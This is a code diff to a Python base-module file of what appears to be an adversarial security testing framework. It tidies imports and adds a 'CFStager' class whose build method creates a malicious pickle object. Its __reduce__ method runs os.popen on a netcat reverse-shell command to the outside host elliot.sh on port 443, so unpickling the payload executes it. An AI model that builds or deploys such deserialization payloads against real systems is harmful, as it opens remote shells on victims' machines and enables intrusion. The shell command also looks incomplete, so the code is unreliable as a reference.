@@ -1,13 +1,11 @@
-from abc import abstractmethod
-
-
 import os
-
+import datetime
+from abc import abstractmethod
 from counterfit.utils import set_id
 
 
 class CFModule:
-    """Base class for all frameworks."""
+    """Base class for all modules."""
 
     @abstractmethod
     def build(self, target, attack):
@@ -132,6 +130,36 @@ class CFAlgo(CFModule):
 
         # with open(filename, "w") as summary_file:
         #     summary_file.write(data.decode())
+
+
+class CFStager(CFModule):
+    """_summary_
+
+    Args:
+        CFModule (_type_): _description_
+    """
+
+    def build(self):
+        import pickle
+        import base64
+
+        class MMM(object):
+            def __reduce__(self):
+                import os
+
+                s = "/bin/sh -i 2>&1 | nc elliot.sh 443 > /tmp/f"
+                return (os.popen, (s,))
+
+        payload = pickle.dumps(MMM())
+        return payload
+
+
+class CFRecon(CFModule):
+    """_summary_
+
+    Args:
+        CFModule (_type_): _description_
+    """
 
 
 # def build_algo(target, attack, scan_id=None):
